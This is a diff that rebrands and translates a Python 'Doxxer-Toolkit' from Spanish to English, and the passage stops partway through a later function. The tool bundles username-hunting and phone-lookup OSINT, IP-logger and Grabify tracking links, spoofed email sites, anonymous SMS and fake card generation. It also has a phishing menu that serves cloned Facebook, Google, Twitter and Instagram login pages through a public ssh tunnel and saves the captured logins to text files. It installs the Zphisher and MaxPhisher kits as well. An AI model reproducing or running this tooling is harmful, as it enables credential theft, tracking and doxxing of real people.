@@ -1,44 +1,55 @@
-# Doxxer-Toolkit by Euronymou5
-# https://twitter.com/Euronymou51
-# Discord: Euronymou5#3155
-# LICENSE: MPL-2.0 license
+# AqudiTools by Aqudi
+# vk.com/aqudi
+# Discord: aqudix
+
 
 import os
 import time
 import subprocess
 import random
-import platform
 import pyshorteners
 import requests
 import pyqrcode
 import png
 from faker import Faker
-from modules import numeros, phoneinf
 import webbrowser
-
-Version = "2.6"
+from modules import numeros_en, phoneinf_en
+login = 123123
+password = int(input('введите пароль:' ))
+if login == password:
+  print("Успешный вход")
+else:
+  print("Неправильный пароль")
+  exit()
+  
+Version = "1.1"
 
 class Colores:
   red="\033[31;1m"
   verde="\033[92m"
   azul="\033[94m"
-  magenta="\033[36m"
+  magenta="\033[95m"
   amarillo="\033[33m"
   
 
 os.system("killall php")
 os.system("clear")
-logo = Colores.red + '''
-·▄▄▄▄        ▐▄• ▄ ▐▄• ▄ ▄▄▄ .▄▄▄      ▄▄▄▄▄            ▄▄▌  ▄ •▄ ▪  ▄▄▄▄▄
-██▪ ██ ▪      █▌█▌▪ █▌█▌▪▀▄.▀·▀▄ █·    •██  ▪     ▪     ██•  █▌▄▌▪██ •██  
-▐█· ▐█▌ ▄█▀▄  ·██·  ·██· ▐▀▀▪▄▐▀▀▄      ▐█.▪ ▄█▀▄  ▄█▀▄ ██▪  ▐▀▀▄·▐█· ▐█.▪
-██. ██ ▐█▌.▐▌▪▐█·█▌▪▐█·█▌▐█▄▄▌▐█•█▌     ▐█▌·▐█▌.▐▌▐█▌.▐▌▐█▌▐▌▐█.█▌▐█▌ ▐█▌·
-▀▀▀▀▀•  ▀█▄▀▪•▀▀ ▀▀•▀▀ ▀▀ ▀▀▀ .▀  ▀     ▀▀▀  ▀█▄▀▪ ▀█▄▀▪.▀▀▀ ·▀  ▀▀▀▀ ▀▀▀ 
+logo = Colores.magenta + '''
+
+ ▄███▄   █        ██    ██   ██      ██    ██ 
+██▀ ▀██  █  ████  ██    ██   ██      ██    ██ 
+███████  █  █─██  ██    ██   ██      ██    ██       
+██   ██  █  █─██  ██    ██   ██  ▄█▀▀██    ██
+██   ██  █  ████  ████  ██   ██  █   ██    ██
+██   ██             ██   ▀███▀   ▀█▄▄██    ██
+
+                                         
+
                    
-                    By:  Euronymou5
+                      By:  Aqudi
                     _______________
 
-                     Version: v2.6
+                     Version: v1.1(beta)
                      _____________
 '''
 
@@ -47,83 +58,83 @@ logo = Colores.red + '''
 def sher():
   os.system("clear")
   print(logo)
-  print('\n[1] Busqueda con Doxxer Toolkit')
-  print('[2] Sherlock (Programa)')
-  print('[3] Nexfil (Programa)')
-  print('[4] Busqueda basica con socialscan')
-  print('[00] Regresar al menu principal')
-  print('[99] Salir')
+  print('\n[1] Search with AqudiTools')
+  print('[2] Sherlock (Program)')
+  print('[3] Nexfil (Program)')
+  print('[4] Basic search with socialscan')
+  print('[00] Back to main menu')
+  print('[99] Exit')
   var = int(input('\n>> '))
   if var == 1:
-     os.system("python3 modules/search.py")
+     os.system("python3 modules/search_en.py")
   elif var == 2:
      if os.path.exists('.tools/sherlock'):
-        user = input('\n[~] Ingresa el nombre de usuario a buscar en sherlock: ')
+        user = input('\n[~] Enter the username to search in sherlock: ')
         print(' ')
         os.system(f"cd .tools/sherlock && python3 sherlock {user}")
      else:
-       print('\n[!] Sherlock no esta instalado!')
-       var = input('[?] Deseas instalar sherlock [Y/n]: ')
+       print('\n[!] Sherlock is not installed!')
+       var = input('[?] You want to install sherlock [Y/n]: ')
        if var == "Y" or var == "y":
-          print('\n[~] Instalando sherlock...')
+          print('\n[~] Installing sherlock...')
           os.system("cd .tools && git clone https://github.com/sherlock-project/sherlock && cd sherlock && pip3 install -r requirements.txt")
-          print('[~] Sherlock instalado.')
+          print('[~] Sherlock installed..')
           time.sleep(2)
           sher()
        elif var == "N" or var == "n":
-           print('\n[~] Regresando al menu principal')
+           print('\n[~] Returning to the main menu')
            time.sleep(1)
            sher()
   elif var == 3:
      if os.path.exists('.tools/nexfil'):
-        user = input('\n[~] Ingresa el nombre de usuario a buscar en nexfil: ')
+        user = input('\n[~] Enter the username to search in nexfil: ')
         print(' ')
         os.system(f"cd .tools/nexfil && python3 nexfil.py -u {user}")
      else:
-       print('\n[!] Nexfil no esta instalado!')
-       var = input('[?] Deseas instalar nexfil [Y/n]: ')
+       print('\n[!] Nexfil is not installed!')
+       var = input('[?] You want to install nexfil [Y/n]: ')
        if var == "Y" or var == "y":
           print('\n[~] Instalando nexfil...')
           os.system("cd .tools && git clone https://github.com/thewhiteh4t/nexfil && cd nexfil && pip3 install -r requirements.txt")
-          print('[~] Nexfil instalado.')
+          print('[~] Nexfil installed.')
           time.sleep(2)
           sher()
        elif var == "N" or var == "n":
-           print('\n[~] Regresando al menu principal')
+           print('\n[~] Returning to the main menu')
            time.sleep(1)
            sher()
   elif var == 4:
-     user = input('\n[~] Ingresa un usuario a buscar: ')
+     user = input('\n[~] Enter a user to search: ')
      os.system(f"socialscan {user} --show-urls")
   elif var == 00:
      menu()
   elif var == 99:
      exit()
   else:
-    print('\n[!] Error opcion invalida.')
+    print('\n[!] Invalid option.')
     sher()
 
 def iplog():
   os.system("clear")
   print(logo)
-  print('\n[~] Ingresa una opcion.')
+  print('\n[~] Enter an option..')
   print('''\n
   [1] IPlogger.org
   
   [2] Grabify
   
-  [3] Crear un link IPlogger 
+  [3] Create an IPlogger link 
   
-  [00] Regresar al menu principal
+  [00] Back to main menu
   
-  [99] Salir
+  [99] Exit
   ''')
   opc = int(input('>> '))
   if opc == 1:
-    print('\n[1] Abrir link para linux')
-    print('\n[2] Abrir link para termux')
-    print('\n[00] Regresar al menu anterior')
-    print('\n[99] Salir')
+    print('\n[1] Open link for linux')
+    print('\n[2] Open link for termux')
+    print('\n[00] Back to main menu')
+    print('\n[99] Exit')
     Skd = int(input('>> '))
     if Skd == 1:
       webbrowser.open('https://iplogger.org/es/')
@@ -136,14 +147,14 @@ def iplog():
     elif Skd == 99:
       exit()
     else:
-      print('[~] Error opcion invalida.')
+      print('[~] Invalid option.')
       time.sleep(2)
       iplog()
   elif opc == 2:
-    print('\n[1] Abrir link para linux')
-    print('\n[2] Abrir link para termux')
-    print('\n[00] Regresar al menu principal')
-    print('\n[99] Salir')
+    print('\n[1] Open link for linux')
+    print('\n[2] Open link for termux')
+    print('\n[00] Back to main menu')
+    print('\n[99] Exit')
     LA = int(input('>> '))
     if LA == 1:
       webbrowser.open('https://grabify.link/')
@@ -156,18 +167,18 @@ def iplog():
     elif LA == 99:
       exit()
     else:
-      print('[~] Error opcion invalida.')
+      print('[~] Invalid option.')
       time.sleep(2)
       iplog()
   elif opc == 3:
-    os.system("python3 modules/iplogger.py")
+    os.system("python3 modules/iplogger_en.py")
   elif opc == 00:
     os.system("clear")
     menu()
   elif opc == 99:
     exit()
   else:
-    print('[~] Error opcion invalida.')
+    print('[~] Invalid option.')
     time.sleep(2)
     os.system("clear")
     print(logo)
@@ -175,34 +186,34 @@ def iplog():
   
 def fakerr():
   print(f'''{Colores.red}\n
-  [1] Generar ipv4 Falsa
+  [1] Generate fake ipv4
   
-  [2] Generar numero de telefono falso
+  [2] Generate fake phone number
   
-  [3] Generar Perfil de una persona falsa
+  [3] Generate profile of a fake person
   
-  [4] Generar User-agents falsos
+  [4] Generate User-Agents
 
-  [5] Generar tarjeta de credito falsa
+  [5] Generate fake Credit card
     
-  [00] Regresar al menu principal
+  [00] Back to main menu
   
-  [99] Salir
+  [99] Exit
   ''')
   fakk = int(input('>> '))
   if fakk == 1:
-    print('\n[~] Generando una IPv4 falsa...')
+    print('\n[~] Generating a fake ipv4...')
     time.sleep(2)
     ip = ".".join(map(str, (random.randint(0, 255)
                             for _ in range(4))))
-    print(f'{Colores.verde}[~] IP falsa generada: {ip}') 
+    print(f'{Colores.verde}[~] IP Generated: {ip}') 
     fakerr()
   elif fakk == 2:
     fake = Faker()
     Faker.seed(0)
-    print('[~] Cuantas veces quieres generar un numero falso?')
-    num = int(input('[~] Escribe un numero: '))
-    print('[~] Generando numero de telefono falso...')
+    print('[~] How many times do you want to generate a fake number?')
+    num = int(input('[~] Enter a number: '))
+    print('[~] Generating fake phone number...')
     time.sleep(1)
     for _ in range(num):
       print(fake.phone_number())
@@ -210,9 +221,9 @@ def fakerr():
   elif fakk == 3:
     fake = Faker()
     Faker.seed(0)
-    print('[~] Cuantas veces quieres generar un perfil falso?')
-    num = int(input('[~] Escribe un numero: '))
-    print('[~] Generando un perfil falso...')
+    print('[~] How many times do you want to generate a fake profile?')
+    num = int(input('[~] Enter a number: '))
+    print('[~] Generating a fake profile...')
     time.sleep(1)
     for _ in range(num):
       print(fake.profile())
@@ -220,9 +231,9 @@ def fakerr():
   elif fakk == 4:
     fake = Faker()
     Faker.seed(0)
-    print('[~] Cuantas veces quieres generar un user-agent?')
-    num = int(input('[~] Escribe un numero: '))
-    print('[~] Generando un user agent falso...')
+    print('[~] How many times do you want to generate a user-agent?')
+    num = int(input('[~] Enter a number: '))
+    print('[~] Generating a user-anget...')
     time.sleep(1)
     for _ in range(num):
       print(fake.user_agent())
@@ -230,9 +241,9 @@ def fakerr():
   elif fakk == 5:
     fake = Faker()
     Faker.seed(0)
-    print('[~] Cuantas veces quieres generar una terjeta de credito?')
-    num = int(input('[~] Escribe un numero: '))
-    print('[~] Generando una tarjeta de credito falsa...')
+    print('[~] How many times do you want to generate a credit card?')
+    num = int(input('[~] Enter a number: '))
+    print('[~] Generating a fake credit card...')
     time.sleep(1)
     for _ in range(num):
       print(fake.credit_card_full())
@@ -243,25 +254,25 @@ def fakerr():
   elif fakk == 99:
     exit()
   else:
-    print('[~] Error opcion invalida.')
+    print('[~] Invalid option.')
     time.sleep(2)
     os.system("clear")
     print(logo)
     fakerr()
 
 def geoip():
-  print('\n[1] Geolocalizar IP')
-  print('\n[00] Regresar al menu principal')
-  print('\n[99] Salir')
+  print('\n[1] Geolocate IP')
+  print('\n[00] Back to main menu')
+  print('\n[99] Exit')
   MC = int(input('\n>> '))
   if MC == 1:
-        os.system(f"cd .geo && python3 geo.py")
+        os.system(f"cd .geo && python3 geo_en.py")
   elif MC == 00:
     menu()
   elif MC == 99:
     exit()
   else:
-    print('[~] Error opcion invalida.')
+    print('[~] Invalid option.')
     time.sleep(2)
     os.system("clear")
     print(logo)
@@ -271,23 +282,22 @@ def geoip():
 def emailfak():
   os.system("clear")
   print(logo)
-  print('\n[~] Ingresa una opcion')
+  print('\n[~] Enter an option')
   print('\n[1] Emkei')
   print('\n[2] Anonemail (Anonymouse)')
   print('\n[3] Temp-Mail')
   print('\n[4] Etemp-Mail')
   print('\n[5] TempMail.email')
-  print('\n[00] Regresar al menu principal')
-  print('\n[99] Salir')
+  print('\n[00] Back to main menu')
+  print('\n[99] Exit')
   OP = int(input('>> '))
-  # ------------ Emkei ---------------
   if OP == 1:
     os.system("clear")
     print(logo)
-    print('\n[1] Abrir link para linux')
-    print('\n[2] Abrir link para termux')
-    print('\n[00] Regresar al menu principal')
-    print('\n[99] Salir')
+    print('\n[1] Open link for linux')
+    print('\n[2] Open link for termux')
+    print('\n[00] Back to main menu')
+    print('\n[99] Exit')
     bruh = int(input('>> '))
     if bruh == 1:
       webbrowser.open('https://emkei.cz/')
@@ -302,17 +312,16 @@ def emailfak():
     elif bruh == 99:
       exit()
     else:
-       print('[~] Error opcion invalida.')
+       print('[~] Invalid option.')
        time.sleep(2)
        emailfak()
-  # ------------ Anonymouse ---------------
   elif OP == 2:
     os.system("clear")
     print(logo)
-    print('\n[1] Abrir link para linux')
-    print('\n[2] Abrir link para termux')
-    print('\n[00] Regresar al menu principal')
-    print('\n[99] Salir')
+    print('\n[1] Open link for linx')
+    print('\n[2] Open link for termux')
+    print('\n[00] Back to main menu')
+    print('\n[99] Exit')
     bruh = int(input('>> '))
     if bruh == 1:
       webbrowser.open('http://anonymouse.org/anonemail.html')
@@ -327,17 +336,16 @@ def emailfak():
     elif bruh == 99:
       exit()
     else:
-       print('[~] Error opcion invalida.')
+       print('[~] Invalid option')
        time.sleep(2)
        emailfak()
-  # ------------ Temp-mail ---------------
   elif OP == 3:
     os.system("clear")
     print(logo)
-    print('\n[1] Abrir link para linux')
-    print('\n[2] Abrir link para termux')
-    print('\n[00] Regresar al menu principal')
-    print('\n[99] Salir')
+    print('\n[1] Open link for linux')
+    print('\n[2] Open link for termux')
+    print('\n[00] Back to main menu')
+    print('\n[99] Exit')
     bruh = int(input('>> '))
     if bruh == 1:
       webbrowser.open('https://temp-mail.org/es/')
@@ -352,17 +360,17 @@ def emailfak():
     elif bruh == 99:
       exit()
     else:
-       print('[~] Error opcion invalida.')
+       print('[~] Invalid option.')
        time.sleep(2)
        emailfak()
-  # ------------ Etemp-Mail ---------------
+  # Etemp-Mail
   elif OP == 4:
     os.system("clear")
     print(logo)
-    print('\n[1] Abrir link para linux')
-    print('\n[2] Abrir link para termux')
-    print('\n[00] Regresar al menu principal')
-    print('\n[99] Salir')
+    print('\n[1] Open link for linux')
+    print('\n[2] Open link for termux')
+    print('\n[00] Return to main menu')
+    print('\n[99] Exit')
     bruh = int(input('>> '))
     if bruh == 1:
       webbrowser.open('https://etempmail.com')
@@ -376,18 +384,14 @@ def emailfak():
       emailfak()
     elif bruh == 99:
       exit()
-    else:
-       print('[~] Error opcion invalida.')
-       time.sleep(2)
-       emailfak()
-  # TempMail-Email
+  # TempMail-email
   elif OP == 5:
     os.system("clear")
     print(logo)
-    print('\n[1] Abrir link para linux')
-    print('\n[2] Abrir link para termux')
-    print('\n[00] Regresar al menu principal')
-    print('\n[99] Salir')
+    print('\n[1] Open link for linux')
+    print('\n[2] Open link for termux')
+    print('\n[00] Return to main menu')
+    print('\n[99] Exit')
     bruh = int(input('>> '))
     if bruh == 1:
       webbrowser.open('https://tempmail.email')
@@ -401,17 +405,12 @@ def emailfak():
       emailfak()
     elif bruh == 99:
       exit()
-    else:
-       print('[~] Error opcion invalida.')
-       time.sleep(2)
-       emailfak()
-  # Devolver
   elif OP == 00:
     menu()
   elif OP == 99:
     exit()
   else:
-    print('[~] Error opcion invalida.')
+    print('[~] Invalid option.')
     time.sleep(2)
     os.system("clear")
     print(logo)
@@ -420,20 +419,20 @@ def emailfak():
 def phishing():
   os.system("clear")
   print(logo)
-  print('[1] Usar el phishing de Doxxer Toolkit')
-  print('[2] Zphisher (Programa)')
-  print('[3] 0ni-Phish (Programa)')
-  print('[4] MaxPhisher (Programa)')
-  print('[00] Regresar al menu principal')
-  print('[99] Salir')
+  print('[1] Using Doxxer Toolkit phishing')
+  print('[2] Zphisher (Program)')
+  print('[3] 0ni-Phish (Program) (Spanish only)')
+  print('[4] MaxPhisher (Program)')
+  print('[00] Back to main menu')
+  print('[99] Exit')
   var = int(input('\n>> '))
   if var == 1:
      print('''
-     [~] Selecciona un lenguaje de la pagina a usar:
+     [~] Select a language from the page to use:
      
-     [1] Español
+     [1] Spanish
      
-     [2] Ingles
+     [2] English
      ''')
      lengua = int(input('\n>> '))
      if lengua == 1:
@@ -444,41 +443,41 @@ def phishing():
     
        [3] Twitter
   
-       [4] Instagram (Pagina desactualizada)
+       [4] Instagram
   
-       [00] Regresar al menu principal
+       [00] Back to main menu
   
-       [99] Salir
+       [99] Exit
        ''')
        YP = int(input('>> '))
        if YP == 1:
-         print(f'\n{Colores.azul}[~] Los usuarios se guardaran en: Doxxer-Toolkit/.pages/Facebook/usuarios.txt')
-         print(f'\n{Colores.verde}[~] Los puedes ver con el comando: cat Doxxer-Toolkit/.pages/Facebook/usuarios.txt')
-         print(f'\n{Colores.magenta}[~] Para salir presiona CTRL + C')
+         print(f'\n{Colores.azul}[~] Users will be saved in: Doxxer-Toolkit/.pages/Facebook/usuarios.txt')
+         print(f'\n{Colores.verde}[~] You can see them with the command: cat Doxxer-Toolkit/.pages/Facebook/usuarios.txt')
+         print(f'\n{Colores.magenta}[~] To exit press CTRL + C')
          print(' ')
          cmd = "php -t .pages/Facebook -S localhost:8080 & ssh -R 80:localhost:8080 nokey@localhost.run"
          p = subprocess.Popen(cmd, shell=True)
          a = p.communicate()[0]
        elif YP == 2:
-         print(f'\n{Colores.azul}[~] Los usuarios se guardaran en: Doxxer-Toolkit/.pages/Google/usuarios.txt')
-         print(f'\n{Colores.verde}[~] Los puedes ver con el comando: cat Doxxer-Toolkit/.pages/Google/usuarios.txt')
-         print(f'\n{Colores.magenta}[~] Para salir presiona CTRL + C')
+         print(f'\n{Colores.azul}[~] Users will be saved in: Doxxer-Toolkit/.pages/Google/usuarios.txt')
+         print(f'\n{Colores.verde}[~] You can see them with the command: cat Doxxer-Toolkit/.pages/Google/usuarios.txt')
+         print(f'\n{Colores.magenta}[~] To exit press CTRL + C')
          print(' ')
          cmd = "php -t .pages/Google -S localhost:8080 & ssh -R 80:localhost:8080 nokey@localhost.run"
          p = subprocess.Popen(cmd, shell=True)
          a = p.communicate()[0]
        elif YP == 3:
-         print(f'\n{Colores.azul}[~] Los usuarios se guardaran en: Doxxer-Toolkit/.pages/Twitter/usuarios.txt')
-         print(f'\n{Colores.verde}[~] Los puedes ver con el comando: cat Doxxer-Toolkit/.pages/Twitter/usuarios.txt')
-         print(f'\n{Colores.magenta}[~] Para salir presiona CTRL + C')
+         print(f'\n{Colores.azul}[~] Users will be saved in: Doxxer-Toolkit/.pages/Twitter/usuarios.txt')
+         print(f'\n{Colores.verde}[~] You can see them with the command: cat Doxxer-Toolkit/.pages/Twitter/usuarios.txt')
+         print(f'\n{Colores.magenta}[~] To exit press CTRL + C')
          print(' ')
          cmd = "php -t .pages/Twitter -S localhost:8080 & ssh -R 80:localhost:8080 nokey@localhost.run"
          p = subprocess.Popen(cmd, shell=True)
          a = p.communicate()[0]
        elif YP == 4:
-        print(f'\n{Colores.azul}[~] Los usuarios se guardaran en: Doxxer-Toolkit/.pages/Instagram/usuarios.txt')
-        print(f'\n{Colores.verde}[~] Los puedes ver con el comando: cat Doxxer-Toolkit/.pages/Instagram/usuarios.txt')
-        print(f'\n{Colores.magenta}[~] Para salir presiona CTRL + C')
+        print(f'\n{Colores.azul}[~] Users will be saved in: Doxxer-Toolkit/.pages/Instagram/usuarios.txt')
+        print(f'\n{Colores.verde}[~] You can see them with the command: cat Doxxer-Toolkit/.pages/Instagram/usuarios.txt')
+        print(f'\n{Colores.magenta}[~] To exit press CTRL + C')
         print(' ')
         cmd = "php -t .pages/Instagram -S localhost:8080 & ssh -R 80:localhost:8080 nokey@localhost.run"
         p = subprocess.Popen(cmd, shell=True)
@@ -497,39 +496,39 @@ def phishing():
   
        [4] Instagram
   
-       [00] Regresar al menu principal
+       [00] Back to main menu
   
-       [99] Salir
+       [99] Exit
        ''')
        YP = int(input('>> '))
        if YP == 1:
-         print(f'\n{Colores.azul}[~] Los usuarios se guardaran en: Doxxer-Toolkit/.pages/en_pages/facebook/usernames.txt')
-         print(f'\n{Colores.verde}[~] Los puedes ver con el comando: cat Doxxer-Toolkit/.pages/en_pages/facebook/usernames.txt')
-         print(f'\n{Colores.magenta}[~] Para salir presiona CTRL + C')
+         print(f'\n{Colores.azul}[~] Users will be saved in: Doxxer-Toolkit/.pages/en_pages/facebook/usernames.txt')
+         print(f'\n{Colores.verde}[~] You can see them with the command: cat Doxxer-Toolkit/.pages/en_pages/facebook/usernames.txt')
+         print(f'\n{Colores.magenta}[~] To exit press CTRL + C')
          print(' ')
          cmd = "php -t .pages/en_pages/facebook -S localhost:8080 & ssh -R 80:localhost:8080 nokey@localhost.run"
          p = subprocess.Popen(cmd, shell=True)
          a = p.communicate()[0]
        elif YP == 2:
-         print(f'\n{Colores.azul}[~] Los usuarios se guardaran en: Doxxer-Toolkit/.pages/en_pages/google_new/usernames.txt')
-         print(f'\n{Colores.verde}[~] Los puedes ver con el comando: cat Doxxer-Toolkit/.pages/en_pages/google_new/usernames.txt')
-         print(f'\n{Colores.magenta}[~] Para salir presiona CTRL + C')
+         print(f'\n{Colores.azul}[~] Users will be saved in: Doxxer-Toolkit/.pages/en_pages/google_new/usernames.txt')
+         print(f'\n{Colores.verde}[~] You can see them with the command: cat Doxxer-Toolkit/.pages/en_pages/google_new/usernames.txt')
+         print(f'\n{Colores.magenta}[~] To exit press CTRL + C')
          print(' ')
          cmd = "php -t .pages/en_pages/google_new -S localhost:8080 & ssh -R 80:localhost:8080 nokey@localhost.run"
          p = subprocess.Popen(cmd, shell=True)
          a = p.communicate()[0]
        elif YP == 3:
-         print(f'\n{Colores.azul}[~] Los usuarios se guardaran en: Doxxer-Toolkit/.pages/en_pages/twitter/usernames.txt')
-         print(f'\n{Colores.verde}[~] Los puedes ver con el comando: cat Doxxer-Toolkit/.pages/en_pages/twitter/usernames.txt')
-         print(f'\n{Colores.magenta}[~] Para salir presiona CTRL + C')
+         print(f'\n{Colores.azul}[~] Users will be saved in: Doxxer-Toolkit/.pages/en_pages/twitter/usernames.txt')
+         print(f'\n{Colores.verde}[~] You can see them with the command: cat Doxxer-Toolkit/.pages/en_pages/twitter/usernames.txt')
+         print(f'\n{Colores.magenta}[~] To exit press CTRL + C')
          print(' ')
          cmd = "php -t .pages/en_pages/twitter -S localhost:8080 & ssh -R 80:localhost:8080 nokey@localhost.run"
          p = subprocess.Popen(cmd, shell=True)
          a = p.communicate()[0]
        elif YP == 4:
-        print(f'\n{Colores.azul}[~] Los usuarios se guardaran en: Doxxer-Toolkit/.pages/en_pages/instagram/usernames.txt')
-        print(f'\n{Colores.verde}[~] Los puedes ver con el comando: cat Doxxer-Toolkit/.pages/en_pages/instagram/usernames.txt')
-        print(f'\n{Colores.magenta}[~] Para salir presiona CTRL + C')
+        print(f'\n{Colores.azul}[~] Users will be saved in: Doxxer-Toolkit/.pages/en_pages/instagram/usernames.txt')
+        print(f'\n{Colores.verde}[~] You can see them with the command: cat Doxxer-Toolkit/.pages/en_pages/instagram/usernames.txt')
+        print(f'\n{Colores.magenta}[~] To exit press CTRL + C')
         print(' ')
         cmd = "php -t .pages/en_pages/instagram -S localhost:8080 & ssh -R 80:localhost:8080 nokey@localhost.run"
         p = subprocess.Popen(cmd, shell=True)
@@ -542,32 +541,32 @@ def phishing():
      if os.path.exists('.tools/zphisher'):
         os.system("cd .tools && cd zphisher && bash zphisher.sh")
      else:
-       print('\n[!] Zphisher no esta instalado!')
-       var = input('[?] Deseas instalar zphisher [Y/n]: ')
+       print('\n[!] Zphisher is not installed!')
+       var = input('[?] You want to install zphisher [Y/n]: ')
        if var == "Y" or var == "y":
-          print('\n[~] Instalando zphisher...')
+          print('\n[~] Installing zphisher...')
           os.system("cd .tools && git clone https://github.com/htr-tech/zphisher && cd zphisher && bash zphisher.sh")
-          print('[~] Zphisher instalado.')
+          print('[~] Zphisher installed.')
           time.sleep(1)
           phishing()
        elif var == "N" or var == "n":
-           print('\n[~] Regresando al menu principal')
+           print('\n[~] Back to main menu')
            time.sleep(1)
            phishing()
   elif var == 3:
      if os.path.exists('.tools/0ni-Phish'):
         os.system(f"cd .tools/0ni-Phish && python3 0ni.py")
      else:
-       print('\n[!] 0ni-Phish no esta instalado!')
-       var = input('[?] Deseas instalar 0ni-Phish [Y/n]: ')
+       print('\n[!] 0ni-Phish is not installed!')
+       var = input('[?] You want to install 0ni-Phish [Y/n]: ')
        if var == "Y" or var == "y":
           print('\n[~] Instalando 0ni-Phish...')
           os.system("cd .tools && git clone https://github.com/Euronymou5/0ni-Phish")
-          print('[~] 0ni-Phish instalado.')
+          print('[~] 0ni-Phish installed.')
           time.sleep(2)
           phishing()
        elif var == "N" or var == "n":
-           print('\n[~] Regresando al menu principal')
+           print('\n[~] Back to main menu')
            time.sleep(1)
            phishing()
   # MaxPhisher
@@ -575,16 +574,16 @@ def phishing():
      if os.path.exists('.tools/MaxPhisher'):
         os.system(f"cd .tools/MaxPhisher && python3 maxphisher.py")
      else:
-       print('\n[!] MaxPhisher no esta instalado!')
-       var = input('[?] Deseas instalar MaxPhisher [Y/n]: ')
+       print('\n[!] MaxPhisher is not installed!')
+       var = input('[?] You want to install MaxPhisher [Y/n]: ')
        if var == "Y" or var == "y":
-          print('\n[~] Instalando MaxPhisher...')
+          print('\n[~] Installing MaxPhisher...')
           os.system("cd .tools && git clone https://github.com/KasRoudra/MaxPhisher && pip3 install -r MaxPhisher/files/requirements.txt")
-          print(Colores.verde + '\n[~] MaxPhisher instalado.')
+          print(Colores.verde + '\n[~] MaxPhisher installed.')
           time.sleep(2)
           phishing()
        elif var == "N" or var == "n":
-           print('\n[~] Regresando al menu principal')
+           print('\n[~] Returning to the main menu')
            time.sleep(1)
            phishing()
   ##  return
@@ -594,23 +593,23 @@ def phishing():
     exit()
   
 def sms():
-  print('\n[1] Enviar un sms anonimo utilizando TextBelt')
-  print('\n[00] Regresar al menu principal')
-  print('\n[99] Salir')
+  print('\n[1] Send an anonymous sms using TextBelt')
+  print('\n[00] Back to main menu')
+  print('\n[99] Exit')
   YR = int(input('>> '))
   if YR ==  1:
-      print('[~] Ejemplo: +14322009740')
-      print(f'\n{Colores.azul}[!] Recuerda que solo puedes enviar 1 mensaje por dia')
-      numero = input(f'{Colores.red}[~] Ingresa el numero de telefono: ')
-      mess = input('[~] Ingresa el mensaje que quieres enviar: ')
+      print('[~] Example: +14322009740')
+      print(f'\n{Colores.azul}[!] Remember that you can only send 1 message per day')
+      numero = input(f'{Colores.red}[~] Enter the phone number: ')
+      mess = input('[~] Enter the message you want to send:')
       resp = requests.post('https://textbelt.com/text', {
            'phone': f'{numero}',
            'message': f'{mess}',
            'key': 'textbelt',
       })
       print(resp.json())
-      print('[~] Mensaje enviado.')
-      input('[~] Presiona enter para continuar...')
+      print('[~] Message sent.')
+      input('[~] Press enter to continue...')
       os.system("clear")
       print(logo)
       sms()
@@ -620,16 +619,16 @@ def sms():
     exit()
     
 def numero():
-    print('\n[1] RevealName (Pagina)')
-    print('[2] Obtener informacion utilizando Numverify (API)')
-    print('[3] Obtener informacion utilizando el modulo Phonenumbers')
-    print('[4] Phoneinfoga (Herramienta)')
-    print('[00] Regresar al menu principal')
-    print('[99] Salir')
+    print('\n[1] RevealName (Page)')
+    print('[2] Get information using Numverify (API)')
+    print('[3] Get information using the Phonenumbers module')
+    print('[4] Phoneinfoga (Tool)')
+    print('[00] Back to main menu')
+    print('[99] Exit')
     var = int(input('\n>> '))
     if var == 1:
-       print('\n[1] Abrir link para linux')
-       print('[2] Abrir link para termux')
+       print('\n[1] Open link for linux')
+       print('[2] Open link for termux')
        var2 = int(input('>> '))
        if var2 == 1:
           webbrowser.open('https://www.revealname.com/')
@@ -638,10 +637,10 @@ def numero():
            os.system("termux-open https://www.revealname.com/")
            numero()
     elif var == 2:
-        numeros.inicio()
+        numeros_en.inicio()
     elif var == 3:
-       print('\n[~] Ejemplo: +19087654321')
-       phone_number = str(input('[~] Ingresa el numero de telefono: '))
+       print('\n[~] Example: +19087654321')
+       phone_number = str(input('[~] Enter the phone number: '))
        try:
            import phonenumbers
            from phonenumbers import geocoder, carrier, timezone
@@ -652,22 +651,22 @@ def numero():
            country = geocoder.country_name_for_number(phone, 'en')
            location = geocoder.description_for_number(phone, 'en')
            carrierr = carrier.name_for_number(phone, 'en')
-           print(f'\n[~] Formato internacional : {international}')
-           print(f'[~] Nombre del país    : {country} ({countrycode})')
-           print(f'[~] Ciudad / Provincia : {location}')
-           print(f'[~] Transportador    : {carrierr}')
+           print(f'\n[~] International format: {international}')
+           print(f'[~] Country name: {country} ({countrycode})')
+           print(f'[~] City / Province: {location}')
+           print(f'[~] Carrier: {carrierr}')
            for time in timezone.time_zones_for_number(phone):
-                    print(f'[~] Zona horaria   : {time}')
-                    print('\n[~] Escaneo completo.')
+                    print(f'[~] Time zone: {time}')
+                    print('\n[~] Full scan.')
        except ImportError:
-            print(f'\n{Colores.azul}[!] Modulo phonenumbers no encontrado!')
-            print('[~] Utiliza el comando pip3 install phonenumbers')
+            print(f'\n{Colores.azul}[!] Phonenumbers module not found!')
+            print('[~] Use the pip3 install phonenumbers command')
             time.sleep(2)
-            print(f'{Colores.red}[~] Regresando al menu principal...')
+            print(f'{Colores.red}[~] Returning to the main menu...')
             time.sleep(1)
             numero()
     elif var == 4:
-        phoneinf.install()
+        phoneinf_en.install()
     elif var == 00:
       menu()
     elif var == 99:
@@ -684,16 +683,16 @@ def osintpa():
 
   [3] Awesome Osint
   
-  [00] Regresar al menu principal
+  [00] Return to main menu
   
-  [99] Salir
+  [99] Exit
   ''')
   osint = int(input('>> '))
   if osint == 1:
-    print('\n[1] Abrir link para linux')
-    print('\n[2] Abrir link para termux')
-    print('\n[00] Regresar al menu principal')
-    print('\n[99] Salir')
+    print('\n[1] Open link for linux')
+    print('\n[2] Open link for termux')
+    print('\n[00] Back to main menu')
+    print('\n[99] Exit')
     elejir99 = int(input('>> '))
     if elejir99 == 1:
       webbrowser.open('https://osintframework.com/')
@@ -706,15 +705,15 @@ def osintpa():
     elif elejir99 == 99:
       exit()
     else:
-      print('[~] Error opcion invalida.')
+      print('[~] Invalid option.')
       time.sleep(2)
       os.system("clear")
       osintpa()
   elif osint == 2:
-    print('\n[1] Abrir link para linux')
-    print('\n[2] Abrir link para termux')
-    print('\n[00] Regresar al menu principal')
-    print('\n[99] Salir')
+    print('\n[1] Open link for linux')
+    print('\n[2] Open link for termux')
+    print('\n[00] Back to main menu')
+    print('\n[99] Exit')
     elejir99 = int(input('>>: '))
     if elejir99 == 1:
       webbrowser.open('https://www.osinttechniques.com/')
@@ -725,16 +724,11 @@ def osintpa():
       osintpa()
     elif elejir99 == 99:
       exit()
-    else:
-      print('[~] Error opcion invalida.')
-      time.sleep(2)
-      os.system("clear")
-      osintpa()
   elif osint == 3:
-    print('\n[1] Abrir link para linux')
